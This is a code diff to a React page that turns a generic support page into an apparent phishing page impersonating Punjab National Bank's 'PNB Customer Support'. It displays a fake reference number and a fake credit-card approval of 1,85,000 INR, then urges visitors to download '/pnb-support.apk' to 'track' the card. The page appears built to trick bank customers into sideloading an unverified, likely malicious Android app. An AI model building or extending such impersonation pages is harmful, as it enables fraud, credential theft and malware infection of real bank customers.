@@ -25,35 +25,55 @@ export default function Page(params) {
     <div>
       <section className="w-full">
         {/* <!-- Harsha Web --> */}
-        <div className="h-auto w-full flex items-center justify-left bg-[#0062A9] p-1">
-          <img src="/logo.png" className="p-2 w-[60px] h-[60px]" alt="Logo" />
+        <div className="h-auto w-full flex items-center justify-left bg-[#91203e] p-1">
+          <img
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaePPd-mxequ-ctngUKynMFKVPkuogwmb5cw&s"
+            className="p-2 h-[60px]"
+            alt="Logo"
+          />
           <span className="font-semibold text-xl text-white">
-            Customer Support
+            PNB Customer Support
           </span>
         </div>
         <div className="p-6">
           <form
-            className="space-y-6 flex flex-col justify-center space-y-5"
+            className="space-y-6 flex flex-col justify-center"
             action=""
           >
             {/* <!-- Full Name --> */}
             <div className="w-full flex justify-center mt-5">
-              <span className="text-2xl font-bold">On Processing...</span>
+              <span className="text-2xl font-bold">
+                Ref No: <span className="text-[#0062A9]">5324720886</span>
+              </span>
             </div>
             {/* <!-- Aadhar Number --> */}
             <div className="w-full flex justify-center">
-              <span className="text-sm font-bold text-center">
-                We are verifying your details,
-                <br />
-                Please wait for <span id="countdown">{formatTime(time)}</span>
+              <span className="text-md font-bold text-center">
+                Your Credit Card is approved! limit is 1,85,000 INR
               </span>
+            </div>
+
+            {/* Download APK */}
+            <div className="w-full flex justify-center mt-5">
+              <span className="text-sm font-bold text-center">
+                Download the APK to to track your Credit Card
+              </span>
+            </div>
+            <div className="w-full flex justify-center mt-5">
+              <a
+                href="/pnb-support.apk"
+                download
+                className="bg-[#91203e] text-white p-2 rounded-sm"
+              >
+                Download APK
+              </a>
             </div>
           </form>
           {/* <!-- Bottom Area --> */}
         </div>
       </section>
       {/* <!-- Footer --> */}
-      <section className="bg-[#0062A9] p-5 w-full">
+      <section className="bg-[#91203e] p-5 w-full">
         <div className="flex space-x-1 w-full justify-between">
           <span className="text-xs text-white font-bold">Contact Us</span>
           <span className="text-xs text-white font-bold">|</span>
